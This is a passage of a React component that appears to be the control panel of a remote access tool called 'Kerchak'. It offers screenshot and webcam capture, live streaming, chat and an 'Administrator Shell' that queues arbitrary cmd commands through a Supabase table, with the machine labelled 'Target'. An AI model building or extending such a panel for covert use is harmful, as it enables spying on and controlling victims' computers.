                <button onClick={() => requestCapture(activeModal === 'screenshot' ? 'ss' : 'webcam')} disabled={isCapturing} className="bg-blue-600 hover:bg-blue-500 text-white px-4 py-2 rounded-lg font-bold text-sm disabled:opacity-50 flex items-center gap-2">{isCapturing ? <RefreshCw size={16} className="animate-spin" /> : <Camera size={16} />}{activeModal === 'screenshot' ? 'Capture Screens' : 'Take Photo'}</button>
                <button onClick={() => setActiveModal(null)} className="text-gray-400 hover:text-white"><X size={20} /></button>
              </div>
            </div>
            <div className="p-6 flex flex-wrap gap-6 overflow-y-auto max-h-[70vh] items-center justify-center bg-[#0a0a0c]">
              {isCapturing ? (<div className="flex flex-col items-center gap-4 py-20"><RefreshCw size={32} className="animate-spin text-blue-500" /><span className="text-gray-400 font-medium tracking-wide animate-pulse">Capturing...</span></div>) : screenshots.length > 0 ? (
                screenshots.map((url, i) => (<div key={i} className="relative group"><img src={url} onClick={() => setZoomedImage(url)} className="max-h-[300px] cursor-pointer group-hover:border-blue-500 transition-all rounded-lg border-2 border-white/10 shadow-2xl object-contain bg-black" alt={`Capture ${i}`} /><div className="absolute top-2 right-2 bg-black/70 text-white text-xs px-2 py-1 rounded backdrop-blur-sm pointer-events-none">{activeModal === 'screenshot' ? `Screen ${i+1}` : `Cam ${i+1}`}</div></div>))
              ) : (<div className="text-gray-500 py-20 flex flex-col items-center gap-3"><Camera size={40} className="opacity-20" /><span>Click the capture button to take a photo.</span></div>)}
            </div>
          </div>
        </div>
      )}

      {activeModal === 'stream' && (
        <div className="fixed inset-0 z-[60] flex items-center justify-center bg-black/80 backdrop-blur-sm p-4">
          <div className="bg-[#111] border border-white/10 rounded-xl overflow-hidden w-full max-w-6xl shadow-2xl">
            <div className="flex justify-between items-center p-4 border-b border-white/10 bg-black/50"><h3 className="font-bold flex items-center gap-2 text-white"><Video className="text-green-400" size={18} /> Live Stream (Metered) - {selectedPcName}</h3><button onClick={() => { if(meteredMeeting) meteredMeeting.leaveMeeting(); setActiveModal(null); }} className="text-gray-400 hover:text-white"><X size={20} /></button></div>
            <div className="p-6 flex flex-wrap gap-4 overflow-y-auto max-h-[80vh] items-center justify-center bg-[#0a0a0c]" id="stream-container"><div className="text-gray-500 py-10 flex flex-col items-center gap-3 w-full" id="stream-loading"><RefreshCw size={40} className="opacity-20 animate-spin" /><span>Waiting for client to connect...</span></div></div>
          </div>
        </div>
      )}

      {zoomedImage && (
        <div className="fixed inset-0 z-[60] flex items-center justify-center bg-black/95 p-4 cursor-pointer backdrop-blur-md" onClick={() => setZoomedImage(null)}>
          <img src={zoomedImage} className="max-w-[95vw] max-h-[95vh] rounded-lg shadow-[0_0_50px_rgba(0,0,0,0.5)] object-contain border border-white/10" alt="Zoomed Capture" /><div className="absolute top-6 right-6 text-white bg-white/10 p-2 rounded-full hover:bg-white/20 transition-colors"><X size={24} /></div>
        </div>
      )}

      {activeModal === 'chat' && (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/80 backdrop-blur-sm p-4">
          <div className="bg-[#111] border border-white/10 rounded-xl overflow-hidden w-full max-w-lg shadow-2xl flex flex-col h-[500px]">
            <div className="flex justify-between items-center p-4 border-b border-white/10 bg-black/50"><h3 className="font-bold flex items-center gap-2 text-pink-400"><MessageSquare size={18} /> Live Chat</h3><div className="flex gap-2"><button onClick={() => { sendCommand(selectedPc!, selectedPcName!, 'chat_close'); setActiveModal(null); }} className="text-xs bg-red-500/20 text-red-400 px-3 py-1 rounded hover:bg-red-500/30">Force Close</button><button onClick={() => setActiveModal(null)} className="text-gray-400 hover:text-white"><X size={20} /></button></div></div>
            <div className="flex-1 p-4 overflow-y-auto flex flex-col gap-3">{chatMessages.map((msg, i) => (<div key={i} className={`p-3 rounded-lg max-w-[80%] ${msg.from === 'me' ? 'bg-red-600/20 text-red-200 self-end rounded-tr-none' : 'bg-white/10 text-gray-200 self-start rounded-tl-none'}`}>{msg.text}</div>))}</div>
            <div className="p-4 border-t border-white/10 flex gap-2"><input type="text" value={chatInput} onChange={e => setChatInput(e.target.value)} onKeyDown={e => { if (e.key === 'Enter') sendChatMessage() }} className="flex-1 bg-white/5 border border-white/10 rounded-lg px-4 py-2 text-sm focus:outline-none focus:border-red-500" placeholder="Type a message..." /><button onClick={sendChatMessage} className="bg-red-600 hover:bg-red-500 text-white px-4 py-2 rounded-lg font-bold text-sm">Send</button></div>
          </div>
        </div>
      )}

      {showTerminal && (
        <div className="fixed inset-0 bg-black/90 backdrop-blur-md z-50 flex items-center justify-center p-4">
          <div className="w-full max-w-5xl bg-[#0c0c0c] rounded-xl border border-white/10 shadow-[0_0_50px_rgba(255,0,0,0.2)] overflow-hidden font-mono flex flex-col h-[600px]">
            <div className="bg-gradient-to-r from-red-950/50 to-[#1a1a1c] px-4 py-3 flex justify-between items-center border-b border-red-500/20"><div className="flex items-center gap-3 text-sm font-bold text-gray-300"><Terminal size={14} className="text-red-500 animate-pulse" /><span className="tracking-tight uppercase text-[10px] letter-spacing-widest text-red-400/80">Kerchak Administrator Shell - {activePC}</span></div><button onClick={() => setShowTerminal(false)} className="text-gray-500 hover:text-white transition-colors"><X size={20} /></button></div>
            <div className="flex-1 p-6 overflow-y-auto text-sm leading-relaxed custom-scrollbar bg-black/60 relative"><div className="absolute inset-0 bg-[radial-gradient(circle_at_50%_50%,rgba(220,38,38,0.05),transparent)] pointer-events-none"></div>{terminalOutput.map((line, i) => (<div key={i} className="whitespace-pre-wrap break-all min-h-[1.2rem] mb-1 font-mono text-gray-300 selection:bg-red-500/30">{line}</div>))}<div className="flex gap-2 items-start mt-4 group"><span className="text-red-500 font-bold flex items-center gap-1 shrink-0"><ChevronRight size={16} className="animate-gradient-red" /><span className="animate-gradient-red">C:\\Users\\{activePC?.split(' / ')[1] || 'Target'}&gt;</span></span><input autoFocus className="bg-transparent border-none outline-none flex-1 text-white caret-blue-500 w-full" value={terminalInput} onChange={(e) => setTerminalInput(e.target.value)} onKeyDown={async (e) => { if (e.key === 'Enter' && terminalInput) { const cmd = terminalInput; setTerminalOutput([...terminalOutput, `C:\\Users\\${activePC?.split(' / ')[1] || 'Target'}> ${cmd}`]); setTerminalInput(""); const pc = computers.find(c => c.pc_name === activePC); if (!pc) return; const { data } = await supabase.from('commands').insert({ computer_id: pc.id, command: 'cmd', args: cmd, status: 'pending' }).select().single(); if (data) { const checkResult = setInterval(async () => { const { data: cmdData } = await supabase.from('commands').select('result, status').eq('id', data.id).single(); if (cmdData?.status === 'executed' && cmdData.result) { setTerminalOutput(prev => [...prev, cmdData.result, ""]); clearInterval(checkResult); } }, 1000); setTimeout(() => clearInterval(checkResult), 25000); } } }} /></div><div ref={terminalEndRef} /></div>
          </div>
        </div>
      )}
    </div>
  );
}
